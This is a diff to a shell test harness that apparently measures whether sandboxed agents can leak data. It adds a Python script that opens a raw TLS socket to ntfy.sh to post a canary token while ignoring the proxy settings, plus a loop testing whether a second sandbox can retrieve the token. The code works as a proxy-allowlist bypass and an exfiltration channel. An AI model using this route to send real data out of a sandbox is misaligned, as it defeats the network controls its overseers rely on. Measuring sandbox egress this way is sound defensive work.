@@ -253,6 +253,70 @@ for net in none open proxy strict; do
   done
 done
 
+# ---- the missing cell: a publisher that does NOT honour the proxy variables ---------
+# Link 3 showed a raw socket reaching the medium under `proxy`, while link 1 was blocked
+# -- but link 1 used urllib, which consults HTTPS_PROXY. So "A cannot publish under
+# proxy" was measured only for a client that cooperates with the proxy, and the chain's
+# failure there could not be attributed. This closes that: the same raw socket, used to
+# POST. If it publishes, the whole chain completes under `proxy` and the allowlist stops
+# only clients that agree to be stopped.
+cat >"$LEAK_A/raw-publish.py" <<'PY'
+import json, random, socket, ssl, sys
+canary, drop, stamp = sys.argv[1], sys.argv[2], sys.argv[3]
+topic = "agent-sandbox-leak-%s-%d" % (stamp, random.randrange(10**9))
+host, url = "ntfy.sh", "https://ntfy.sh/%s" % topic
+out = {"topic": topic, "token": canary}
+try:
+    body = canary.encode()
+    req = ("POST /%s HTTP/1.1\r\nHost: %s\r\nUser-Agent: leak-study\r\n"
+           "Content-Length: %d\r\nConnection: close\r\n\r\n"
+           % (topic, host, len(body))).encode() + body
+    ctx = ssl.create_default_context()
+    with socket.create_connection((host, 443), timeout=25) as s:
+        with ctx.wrap_socket(s, server_hostname=host) as ts:
+            ts.sendall(req)
+            chunks = []
+            while True:
+                b = ts.recv(65536)
+                if not b:
+                    break
+                chunks.append(b)
+    resp = b"".join(chunks).decode("utf-8", "replace")
+    status = resp.split("\r\n", 1)[0] if resp else ""
+    out["open"] = "ok" if " 200" in status else ("http:" + status[:40])
+    out["token_found"] = " 200" in status
+except Exception as e:  # noqa: BLE001 - failing to publish IS the measurement
+    out["open"] = type(e).__name__
+    out["token_found"] = False
+try:
+    with open(drop, "w", encoding="utf-8") as fh:
+        fh.write("scratch notes\nendpoint: %s\n" % url)
+except OSError as e:
+    out["drop_error"] = str(e)
+print(json.dumps(out))
+PY
+
+for net in proxy strict; do
+  rm -f "$DROP"
+  C="LEAK-RAWCHAIN-${net}-$STAMP-$RANDOM"
+  leak_say "net=$net — link 1 via RAW SOCKET: can A publish without honouring the proxy?"
+  leak_read_sandboxed "$net" "$LEAK_A" "$LEAK_A/raw-publish.py" \
+    "$LEAK_RUN/rawpub-$net.json" "$C" "$DROP" "$STAMP"
+  leak_record "t2-$net-1-publish-raw" --set "topology=T2-$net-publish-raw" \
+    --set "net=$net" --set "link=1-publish" --set "how=raw-socket" --set "canary=$C" \
+    --reader "$LEAK_RUN/rawpub-$net.json"
+
+  TOPIC="$(python3 -c "import json;print(json.load(open('$LEAK_RUN/rawpub-$net.json')).get('topic',''))")"
+  leak_await_medium "https://ntfy.sh/$TOPIC/json?poll=1" "$C" "$LEAK_RUN/rawpub-$net.json"
+
+  leak_say "net=$net — and does the chain then complete, raw end to end?"
+  leak_read_sandboxed "$net" "$LEAK_B" "$LEAK_B/discover.py" \
+    "$LEAK_RUN/rawchain-$net.json" raw "$DROP" "$C"
+  leak_record "t2-$net-chain-raw" --set "topology=T2-$net-chain-raw" --set "net=$net" \
+    --set "link=chain" --set "how=raw-socket" --set "canary=$C" \
+    --reader "$LEAK_RUN/rawchain-$net.json"
+done
+
 # ---- (a) a PUBLIC, INDEXED medium, and the allowlist cap ----------------------------
 # No address is passed. A posts into a reserved issue of this repository; B enumerates
 # the repository's issues and looks for the token. What B knows is the SUBJECT -- the
